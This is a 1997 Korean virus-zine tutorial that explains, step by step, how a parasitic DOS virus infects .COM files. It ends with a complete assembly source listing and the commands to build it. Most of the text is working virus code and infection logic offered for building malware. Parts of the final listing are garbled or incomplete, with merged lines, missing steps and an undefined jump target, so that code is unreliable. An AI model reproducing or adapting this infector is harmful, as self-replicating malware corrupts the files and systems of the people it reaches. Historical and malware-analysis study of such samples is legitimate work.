
 기생형 바이러스 해부하기                                       CVC #01   97/06

----------------------------------------------------------------> Hong_gil_dong

기생형바이러스 (COM형 파일만 감염) 1-1
본 내용은 스탤스워리어가 쓴것입니다
------------------------------------------------------

다음은 순서도 입니다:
  1.델타 옵샛을 계산한다.
  2.3바이트를 복구한다
  3.DTA를 저장한다
  4..COM 파일를 찾는다 없으면 15번으로 이동
  5.파일의 속성 날짜 시간을 저장한다.
  6.파일속성을 바꾼다.
  7.파일을 읽기 쓰기로 연다.
  8.파일의 첫번쩨 3바이트를 읽는다
  9.파일이 감염됐는지 검사한다
     a)감염됐으면 14번으로 이동한다.
     b)감염안됐으면 계속 진행한다
 10.파일의 처음에 3바이트를 쓴다.
 11.바이러스를 파일에 붙여쓴다
 12.시간과 날짜를  복구한다
 13.파일을 닫는다
 14.속성를 복구한다.
 15.DTA를 복구한다
 16.제어를 원래 프로그램으로 넘긴다(메모리에서)

다음은 순서도 하나하나에 대한 설명입니다.

  1.첫번째로 델타 옵셋을 계산한다, 왜냐하면 우리가
    사용하는 변수의 옵셋주소가 파일크기와 관련이 있기때문이다.

        begin:  db 0e9h,0,0          ;vstart로Jump한다
        vstart: call doit
        doit:   pop  bp              ;델타옵셋을 계산한다
                sub  bp,OFFSET doit

  2.자신이 자기파일에 감염되었다면 bytes 안에 저장해둔
    3바이트를 복구시킨다

        lea  si,[bp+OFFSET bytes]    ;원래의 3바이트를
        mov  di,100h                 ;복구시킨다
        push di
        movsw
        movsb

  3.DTA 는 명령어를 이어주는 다리역활를 한다,그래서 원래의
    값을 보존해주어야 한다. DTA 에 잘못된 값이 들어있으면
    프로그램에 오류가 발생이 된다


        lea  dx,[bp+OFFSET dta]  ;dat를 저장
        mov  ah,1ah              ; 해둔다
        int  21h

    dta는 다음과같이 정의한다:
        dta db 42 dup (?)

  4.파일을 찾는다

        mov  ah,4eh             ;파일찾기 함수.
        lea  dx,[bp+com_files]  ;.COM 파일를 찾는다
        mov  cx,7               ;속성은 모두
        int  21h

    com_files 은 다음가같이 정의한다
     com_files: db "*.com",0

  5.파일속성과 시간 날짜를 저장해둔다.

        lea  si,[bp+OFFSET dta+21]
        mov  cx,5
        lea  di,[bp+OFFSET attributes]
        rep  movsb
  6.파일속성을 읽고쓰기가 가능하도록 바꾼다

        mov  ax,4301h                 ;  파 일
        xor  cx,cx                    ; 속성을
        lea  dx,[bp+dta+30]           ; 바꾼다
        int  21h
  7.파일를 읽고쓰기형태로 연다


        mov  ax,3d02h
        lea  dx,[bp+OFFSET dta+30]
        int  21h

  8.파일를 첫번째 3바이트를 읽어와 저장한다.
    파일이 감염됐는지 조사하는데 사용한다

        xchg ax,bx             ;파일핸들를 bx로 옮긴다
        mov  ah,3fh            ;<파일의
        lea  dx,[bp+bytes]     ; 3바이트를 읽어와
        mov  cx,3              ; bytes에 저장한다>
        int  21h

  9.DTA 에있는 파일크기와 bytes 에저장되어있는 파일크기를
   비교한다. 만약 감염이됐다면 bytes는 jump 명령을 가지고
   있을것이다

  mov  ax,word ptr [bp+dta+26]  ;DTA 로부터 파일크기를 얻는다
  mov  cx,word ptr [bp+bytes+1] ;jmp 할위치를 얻는다
  add  cx,vend-vstart+3         ;파일크기를 얻는다.
  cmp  ax,cx                    ;파일크기를 비교한다
  jz   another                  ;같으면 다른 파일을 찾는다

 10.파일의 첫부분을 jmp 명령으로 바꾼다

        sub  ax,3                     ;세로운 옵셋을
        mov  word ptr [bp+new_offs],ax;new_offs에 복사한다
        mov  ax,4200h                 ;파일의 처음으로
        xor  cx,cx                    ;이동한다
        cwd
        int  21h
        mov  ah,40h             ;3바이트를
        mov  cx,3               ;파일에
        lea  dx,[bp+e9]         ;쓴다
        int  21h

 11.파일의 끝에다 바이러스를 쓴다:

        mov  ax,4202h        ;파일끝으로
        xor  cx,cx           ;이동한다

        cwd                      ; 파일에다
        int  21h                 ; 바이러스를
        mov  ah,40h              ; 붙여쓴다
        mov  cx,vend-vstart
        lea  dx,[bp+vstart]
        int  21h

 12.파일의 날짜와 시간을 복귀시킨다

        mov  ax,5701h
        mov  dx,word ptr [bp+date]
        mov  cx,word ptr [bp+time]
        int  21h
 13.파일을 닫는다

        mov  ah,3eh
        int  21h

 14.파일속성을 복귀시킨다

        mov  ax,4301h
        lea  dx,[bp+OFFSET dta+30]
        xor  ch,ch
        mov  cl,byte ptr [bp+attributes]
        int  21h

 15. DTA를 복귀시킨다:

        mov  dx,80h
        mov  ah,1ah
        int  21h

 16.제어를 원래 파일로 옮긴다:

        retn

 여기서  부터는 위의 내용을 이용한 소스입니다
 -<EXAMPLE1.ASM>-----------------------------------
 ;.COM 파일 감염 기생형 바이러스
 ; 컴파일 명령
 ; TASM /m2 EXAMPLE1.ASM
 ; TLINK /t EXAMPLE1.ASM
 code    segment
 assume  cs:code
         org 100h
 begin:  db 0e9h,0,0               ;tart.로 점프한다
 vstart: call doit
 doit:   pop  bp                   ;델타옵셋을 계산
         sub  bp,OFFSET doit
         lea  si,[bp+OFFSET bytes] ;원래의 3바이트를
         mov  di,100h              ; 복귀시킨다
         push di
         movsw
         movsb

         lea  dx,[bp+OFFSET dta]   ;dat를 저장한다
         mov  ah,1ah
         int  21h
 first:  mov  ah,4eh               ;첫번째 희생자를
         lea  dx,[bp+com_files]     21h
         xchg ax,bx                ;화일핸들을 ax로 복사
         mov  ah,3fh               ;<파일의 첫번째
         lea  dx,[bp+bytes]        ; 3바이트를 저장해
         mov  cx,3                 ; 둔다>
         int  21h
         mov  ax,word ptr [bp+dta+26] ;파일 크기를 얻는다
         mov  cx,word ptr [bp+bytes+1];jmp 위치를 얻느다
         add  cx,vend-vstart+3
         cmp  ax,cx            ;파일크기를 비교한다.
         jz   another          ;같으면 다른 희생자를 찾는다
         sub  ax,3
         mov  word ptr [bp+new_offs],ax
         xor  al,al            ;파일처음으로 이동
         call move_fp

         mov  ah,40h                ;3바이트를
         mov  cx,3                  ;파일에 쓴다
         lea  dx,[bp+e9]
         int  21h
         mov  al,2                  ;파일끝으로
         call move_fp               ;이동한다
         mov  ah,40h                ;<바이러스를
         mov  cx,vend-vstart        ; 파일에 붙여
         lea  dx,[bp+vstart]        ; 쓴다>
         int  21h
         mov  ax,5701h               ;<원래의 파일
         mov  dx,word ptr [bp+date]  ; 시간 날짜를
         mov  cx,word ptr [bp+time]  ; 복구한다>
         int  21h
  another:mov  ah,3eh             ;<파일을
         int  21h                ; 닫는다>
         mov  ax,4301h           ;<속성을
         lea  dx,[bp+OFFSET dta+30] ; 복구한다
         xor  ch,ch
         mov  cl,byte ptr [bp+attributes]
         int  21h
         mov  ah,4fh           ;다음 희생자를
         jmp  next             ;찾는다
  quit:   mov  dx,80h           ;DTA를 복구한다
         mov  ah,1ah
         int  21h
         retn
  move_fp:mov  ah,42h
         xor  cx,cx
         cwd
         int  21h
         retn

  com_files db '*.com',0
  bytes db 0cdh,20h,0
  e9 db 0e9h
  vend equ $
  new_offs dw ?
  attributes db ?
  time dw ?
  date dw ?
  dta db 42 dup (?)
  code    ENDS
         END    begin
  ------------기생형 com 바이러스 끝 ------------------

